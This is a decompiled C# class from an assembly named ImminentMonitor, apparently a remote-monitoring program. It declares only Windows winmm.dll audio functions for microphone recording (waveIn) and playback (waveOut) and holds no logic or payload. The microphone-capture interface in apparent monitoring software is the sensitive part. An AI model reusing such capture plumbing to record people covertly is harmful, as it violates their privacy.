// Decompiled with JetBrains decompiler
// Type: Class96
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using System;
using System.Runtime.InteropServices;

internal sealed class Class96
{
  [DllImport("winmm.dll")]
  public static extern int waveInAddBuffer(IntPtr intptr_0, IntPtr intptr_1, int int_0);

  [DllImport("winmm.dll")]
  public static extern int waveInClose(IntPtr intptr_0);

  [DllImport("winmm.dll")]
  public static extern uint waveInGetDevCaps(uint uint_0, ref Struct16 struct16_0, int int_0);

  [DllImport("winmm.dll")]
  public static extern int waveInGetNumDevs();

  [DllImport("winmm.dll")]
  public static extern int waveInOpen(
    ref IntPtr intptr_0,
    int int_0,
    Class95 class95_0,
    Delegate3 delegate3_0,
    int int_1,
    int int_2);

  [DllImport("winmm.dll")]
  public static extern int waveInPrepareHeader(IntPtr intptr_0, IntPtr intptr_1, int int_0);

  [DllImport("winmm.dll")]
  public static extern int waveInReset(IntPtr intptr_0);

  [DllImport("winmm.dll")]
  public static extern int waveInStart(IntPtr intptr_0);

  [DllImport("winmm.dll")]
  public static extern int waveInStop(IntPtr intptr_0);

  [DllImport("winmm.dll")]
  public static extern int waveInUnprepareHeader(IntPtr intptr_0, IntPtr intptr_1, int int_0);

  [DllImport("winmm.dll")]
  public static extern int waveOutClose(IntPtr intptr_0);

  [DllImport("winmm.dll")]
  public static extern uint waveOutGetDevCaps(uint uint_0, ref Struct16 struct16_0, int int_0);

  [DllImport("winmm.dll")]
  public static extern int waveOutGetNumDevs();

  [DllImport("winmm.dll")]
  public static extern int waveOutGetPosition(IntPtr intptr_0, ref int int_0, int int_1);

  [DllImport("winmm.dll")]
  public static extern int waveOutGetVolume(IntPtr intptr_0, ref int int_0);

  [DllImport("winmm.dll")]
  public static extern int waveOutOpen(
    ref IntPtr intptr_0,
    int int_0,
    Class95 class95_0,
    Delegate19 delegate19_0,
    int int_1,
    int int_2);

  [DllImport("winmm.dll")]
  public static extern int waveOutPause(IntPtr intptr_0);

  [DllImport("winmm.dll")]
  public static extern int waveOutPrepareHeader(IntPtr intptr_0, IntPtr intptr_1, int int_0);

  [DllImport("winmm.dll")]
  public static extern int waveOutReset(IntPtr intptr_0);

  [DllImport("winmm.dll")]
  public static extern int waveOutRestart(IntPtr intptr_0);

  [DllImport("winmm.dll")]
  public static extern int waveOutSetVolume(IntPtr intptr_0, int int_0);

  [DllImport("winmm.dll")]
  public static extern int waveOutUnprepareHeader(IntPtr intptr_0, IntPtr intptr_1, int int_0);

  [DllImport("winmm.dll")]
  public static extern int waveOutWrite(IntPtr intptr_0, IntPtr intptr_1, int int_0);
}
